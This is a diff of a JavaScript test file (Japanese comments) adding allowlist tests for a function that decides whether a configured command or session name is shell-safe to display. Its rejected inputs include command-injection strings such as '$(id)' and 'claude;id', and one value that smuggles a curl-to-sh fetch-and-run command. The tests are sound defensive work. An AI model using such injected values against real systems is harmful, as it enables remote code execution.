@@ -14,6 +14,7 @@ import {
   collectReservedWpEnvPorts,
   expandTemplate,
   isPortAvailable,
+  isShellSafeCommandForDisplay,
 } from '../src/engine/build-command.js';
 
 // #7 の既定値と同じフラット構造 + wpEnv フラグ（#8）。
@@ -209,4 +210,65 @@ test('buildCommand: issue URL が無い汎用タスクでは本文中の {...} �
 test('buildCommand: 汎用タスクは body 無しなら title のみ', async () => {
   const { prompt } = await buildCommand('タイトルだけ', '', 1, DEFAULT_CFG);
   assert.equal(prompt, 'タイトルだけ');
+});
+
+// -------------------------------------------------------
+// isShellSafeCommandForDisplay（案内文へコマンド行として値を埋めてよいかの許可リスト判定）
+//
+// doctor の hint（tmux.claudeCommand）と `up` の tmux attach 案内（tmux.session）が
+// 共有する判定なので、文字種の線引きはここで一括して固定する（issue #253）。
+// -------------------------------------------------------
+
+test('isShellSafeCommandForDisplay: 実行ファイル名・パス・セッション名として正常な値は true', () => {
+  for (const value of [
+    'claude',
+    'my-claude',
+    'claude_2.0',
+    'vk-orch',
+    '/opt/homebrew/bin/claude',
+    '/Users/someuser/.local/share/fnm/v20.11.0/bin/claude',
+    'user@host:/opt/bin/claude',
+    'NODE_OPTIONS=--x',
+  ]) {
+    assert.equal(isShellSafeCommandForDisplay(value), true, `安全と判定すること: ${value}`);
+  }
+});
+
+test('isShellSafeCommandForDisplay: シェルで意味を持つ文字を含む値は false（許可リストなので網羅は不要）', () => {
+  // 代表例を並べるが、判定自体は「許可した文字以外は全部不許可」なので、ここに無い文字
+  // （将来のシェルが特別扱いする文字）も自動的に false になる。
+  for (const value of [
+    'claude`id`',
+    '$(id)',
+    'claude;id',
+    'claude|id',
+    'claude&&id',
+    'claude>out',
+    'claude<in',
+    'claude*',
+    'claude?',
+    'claude!',
+    '~/bin/claude',
+    '#claude',
+    "claude'",
+    'claude"',
+    'claude\\id',
+    'claude{a}',
+    'claude[a]',
+    'my claude',
+    'vk-orch; curl -s a.io/x | sh',
+  ]) {
+    assert.equal(isShellSafeCommandForDisplay(value), false, `不安全と判定すること: ${value}`);
+  }
+});
+
+test('isShellSafeCommandForDisplay: 空・null・制御文字は fail-close で false', () => {
+  // 値が取れないときに「安全」へ倒れると、空のコマンド行を案内してしまう。
+  for (const value of ['', null, undefined, 'claude\nid', 'claude\u0007', 'claude\tid']) {
+    assert.equal(
+      isShellSafeCommandForDisplay(value),
+      false,
+      `不安全と判定すること: ${JSON.stringify(value)}`,
+    );
+  }
 });
